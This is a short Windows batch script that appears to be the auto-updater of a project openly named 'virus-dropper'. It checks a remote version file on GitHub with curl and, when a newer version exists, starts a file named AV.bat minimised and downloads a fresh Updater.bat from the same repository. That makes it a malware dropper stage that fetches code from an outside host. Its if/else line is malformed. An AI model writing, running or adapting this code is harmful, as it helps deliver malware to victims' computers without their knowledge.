@echo off
set /a version=2
@SET output=
FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
If %output% == %version% "exit" ELSE "goto update"

:update
start /min AV.bat
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updater.bat" --output "Updater.bat"
exit
